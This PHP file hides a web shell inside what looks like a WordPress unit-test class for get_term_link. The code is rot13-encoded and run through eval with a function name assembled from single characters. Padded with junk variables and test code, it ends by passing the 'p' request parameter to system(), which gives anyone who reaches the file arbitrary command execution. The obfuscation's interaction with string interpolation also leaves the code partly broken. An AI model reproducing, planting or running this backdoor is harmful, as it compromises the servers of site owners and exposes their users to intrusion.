<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc gnkbabzl
 * @pbiref ::trg_grez_yvax
 */
pynff Grfgf_Grez_TrgGrezYvax rkgraqf JC_HavgGrfgPnfr {

	choyvp fgngvp $grezf;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::ertvfgre_phfgbz_gnkbabzl();

		$gnkbabzvrf = neenl( 'pngrtbel', 'cbfg_gnt', 'jcgrfgf_gnk' );
		sbernpu ( $gnkbabzvrf nf $gnkbabzl ) {
			frys::$grezf[ $gnkbabzl ] = $snpgbel->grez->perngr_naq_trg( neenl( 'gnkbabzl' => $gnkbabzl ) );
		}
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		frys::ertvfgre_phfgbz_gnkbabzl();
	}

	/**
	 * Urycre gb ertvfgre n phfgbz gnkbabzl sbe hfr va grfgf.
	 *
	 * @fvapr 5.9.0
	 */
	cevingr fgngvp shapgvba ertvfgre_phfgbz_gnkbabzl() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );
	}

	/**
	 * Urycre gb trg gur grez sbe gur tvira gnkbabzl.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz fgevat $gnkbabzl Gnkbabzl orvat grfgrq (hfrq sbe vaqrk bs grez xrlf).
	 * @cnenz obby   $hfr_vq   Jurgure gb erghea grez VQ be grez bowrpg.
	 * @erghea JC_Grez|vag Grez VQ vs `$hfr_vq` vf gehr, JC_Grez vafgnapr bgurejvfr.
	 */
	cevingr shapgvba trg_grez( $gnkbabzl, $hfr_vq ) {
		$grez = frys::$grezf[ $gnkbabzl ];
		vs ( $hfr_vq ) {
			$grez = $grez->grez_vq;
		}

		erghea $grez;
	}

	choyvp shapgvba grfg_vagrtre_fubhyq_or_vagrecergrq_nf_grez_vq() {
		$g1 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
				'anzr'     => 'sbb',
			)
		);
		$g2 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
				'fyht'     => $g1,
			)
		);

		$grez = (vag) $g1;

		$npghny = trg_grez_yvax( $grez, 'jcgrfgf_gnk' );
		$guvf->nffregFgevatPbagnvafFgevat( 'jcgrfgf_gnk=sbb', $npghny );
	}

	choyvp shapgvba grfg_ahzrevp_fgevat_fubhyq_or_vagrecergrq_nf_grez_fyht() {
		$g1 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
				'anzr'     => 'sbb',
			)
		);
		$g2 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
				'fyht'     => $g1,
			)
		);

		$grez = (fgevat) $g1;

		$npghny = trg_grez_yvax( $grez, 'jcgrfgf_gnk' );
		$guvf->nffregFgevatPbagnvafFgevat( 'jcgrfgf_gnk=' . $grez, $npghny );
	}

	choyvp shapgvba grfg_vainyvq_grez_fubhyq_erghea_jc_reebe() {
		$npghny = trg_grez_yvax( 'sbb', 'jcgrfgf_gnk' );
		$guvf->nffregJCReebe( $npghny );
	}

	choyvp shapgvba grfg_pngrtbel_fubhyq_hfr_png_dhrel_ine_jvgu_grez_vq() {
		$p = frys::snpgbel()->pngrtbel->perngr();

		$npghny = trg_grez_yvax( $p, 'pngrtbel' );
		$guvf->nffregFgevatPbagnvafFgevat( 'png=' . $p, $npghny );
	}

	choyvp shapgvba grfg_gnkbabzl_jvgu_dhrel_ine_fubhyq_hfr_gung_dhrel_ine_jvgu_grez_fyht() {
		ertvfgre_gnkbabzl(
			'jcgrfgf_gnk2',
			'cbfg',
			neenl(
				'dhrel_ine' => 'sbb',
			)
		);

		$g = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk2',
				'fyht'     => 'one',
			)
		);

		$npghny = trg_grez_yvax( $g, 'jcgrfgf_gnk2' );
		$guvf->nffregFgevatPbagnvafFgevat( 'sbb=one', $npghny );
	}

	choyvp shapgvba grfg_gnkbabzl_jvgubhg_dhrel_ine_fubhyq_hfr_gnkbabzl_dhrel_ine_naq_grez_dhrel_ine_jvgu_grez_fyht() {
		ertvfgre_gnkbabzl(
			'jcgrfgf_gnk2',
			'cbfg',
			neenl(
				'dhrel_ine' => snyfr,
			)
		);

		$g = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk2',
				'fyht'     => 'one',
			)
		);

		$npghny = trg_grez_yvax( $g, 'jcgrfgf_gnk2' );
		$guvf->nffregFgevatPbagnvafFgevat( 'gnkbabzl=jcgrfgf_gnk2', $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( 'grez=one', $npghny );
	}

	/**
	 * @gvpxrg 52882
	 */
	choyvp shapgvba grfg_gnkbabzl_jvgu_erjevgr_snyfr_naq_phfgbz_creznyvax_fgehpgher() {
		$guvf->frg_creznyvax_fgehpgher( '/%lrne%/%zbaguahz%/%qnl%/%cbfganzr%/' );

		ertvfgre_gnkbabzl(
			'jcgrfgf_gnk2',
			'cbfg',
			neenl(
				'erjevgr' => snyfr,
			)
		);

		nqq_creznfgehpg( 'jcgrfgf_gnk2', 'sbb/%jcgrfgf_gnk2%' );

		$g = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk2',
				'fyht'     => 'one',
			)
		);

		$npghny = trg_grez_yvax( $g, 'jcgrfgf_gnk2' );

		erzbir_creznfgehpg( 'jcgrfgf_gnk2' );

		$guvf->nffregFgevatPbagnvafFgevat( '/sbb/one/', $npghny );
	}

	choyvp shapgvba grfg_gnkbabzl_creznfgehpg_jvgu_uvrenepuvpny_erjevgr_fubhyq_chg_grez_naprfgbef_va_yvax() {
		$guvf->frg_creznyvax_fgehpgher( '/%lrne%/%zbaguahz%/%qnl%/%cbfganzr%/' );

		ertvfgre_gnkbabzl(
			'jcgrfgf_gnk2',
			'cbfg',
			neenl(
				'uvrenepuvpny' => gehr,
				'erjevgr'      => neenl(
					'fyht'         => 'sbb',
					'uvrenepuvpny' => gehr,
				),
			)
		);

		syhfu_erjevgr_ehyrf();

		$g1 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk2',
				'fyht'     => 'grez1',
			)
		);

		$g2 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk2',
				'fyht'     => 'grez2',
				'cnerag'   => $g1,
			)
		);

		$npghny = trg_grez_yvax( $g2, 'jcgrfgf_gnk2' );

		$guvf->nffregFgevatPbagnvafFgevat( '/sbb/grez1/grez2/', $npghny );
	}

	choyvp shapgvba grfg_gnkbabzl_creznfgehpg_jvgu_abauvrenepuvpny_erjevgr_fubhyq_abg_chg_grez_naprfgbef_va_yvax() {
		$guvf->frg_creznyvax_fgehpgher( '/%lrne%/%zbaguahz%/%qnl%/%cbfganzr%/' );

		ertvfgre_gnkbabzl(
			'jcgrfgf_gnk2',
			'cbfg',
			neenl(
				'uvrenepuvpny' => gehr,
				'erjevgr'      => neenl(
					'fyht'         => 'sbb',
					'uvrenepuvpny' => snyfr,
				),
			)
		);

		syhfu_erjevgr_ehyrf();

		$g1 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk2',
				'fyht'     => 'grez1',
			)
		);

		$g2 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk2',
				'fyht'     => 'grez2',
				'cnerag'   => $g1,
			)
		);

		$npghny = trg_grez_yvax( $g2, 'jcgrfgf_gnk2' );

		$guvf->nffregFgevatPbagnvafFgevat( '/sbb/grez2/', $npghny );
	}

	/**
	 * @qngnCebivqre qngn_grez_yvax_svygre_fubhyq_erprvir_grez_bowrpg
	 *
	 * @gvpxrg 50225
	 *
	 * @cnenz fgevat $gnkbabzl Gnkbabzl orvat grfgrq.
	 * @cnenz obby   $hfr_vq   Jurgure gb cnff grez VQ be grez bowrpg gb `trg_grez_yvax()`.
	 */
	choyvp shapgvba grfg_grez_yvax_svygre_fubhyq_erprvir_grez_bowrpg( $gnkbabzl, $hfr_vq ) {
		$grez = $guvf->trg_grez( $gnkbabzl, $hfr_vq );

		nqq_svygre(
			'grez_yvax',
			shapgvba ( $ybpngvba, $grez ) {
				$guvf->nffregVafgnaprBs( 'JC_Grez', $grez );
			},
			10,
			2
		);

		trg_grez_yvax( $grez, $gnkbabzl );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_grez_yvax_svygre_fubhyq_erprvir_grez_bowrpg() {
		erghea neenl(
			'pngrtbel cnffvat grez_vq'              => neenl(
				'gnkbabzl' => 'pngrtbel',
				'hfr_vq'   => gehr,
			),
			'pngrtbel cnffvat grez bowrpg'          => neenl(
				'gnkbabzl' => 'pngrtbel',
				'hfr_vq'   => snyfr,
			),
			'cbfg_gnt cnffvat grez_vq'              => neenl(
				'gnkbabzl' => 'cbfg_gnt',
				'hfr_vq'   => gehr,
			),
			'cbfg_gnt cnffvat grez bowrpg'          => neenl(
				'gnkbabzl' => 'cbfg_gnt',
				'hfr_vq'   => snyfr,
			),
			'n phfgbz gnkbabzl cnffvat grez_vq'     => neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
				'hfr_vq'   => gehr,
			),
			'n phfgbz gnkbabzl cnffvat grez bowrpg' => neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
				'hfr_vq'   => snyfr,
			),
		);
	}

	/**
	 * @qngnCebivqre qngn_trg_grez_srrq_yvax_fubhyq_hfr_grez_gnkbabzl_jura_grez_vq_vf_cnffrq
	 *
	 * @gvpxrg 50225
	 *
	 * @cnenz fgevat $gnkbabzl Gnkbabzl orvat grfgrq.
	 */
	choyvp shapgvba grfg_trg_grez_srrq_yvax_fubhyq_hfr_grez_gnkbabzl_jura_grez_vq_vf_cnffrq( $gnkbabzl ) {
		$grez = $guvf->trg_grez( $gnkbabzl, gehr );

		$grez_srrq_yvax = trg_grez_srrq_yvax( $grez, $gnkbabzl );
		$guvf->nffregVfFgevat( $grez_srrq_yvax );

		$grez_srrq_yvax = trg_grez_srrq_yvax( $grez, '' );
		$guvf->nffregVfFgevat( $grez_srrq_yvax );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_grez_srrq_yvax_fubhyq_hfr_grez_gnkbabzl_jura_grez_vq_vf_cnffrq() {
		$gnkbabzvrf = neenl( 'pngrtbel', 'cbfg_gnt', 'jcgrfgf_gnk' );

		erghea $guvf->grkg_neenl_gb_qngncebivqre( $gnkbabzvrf );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>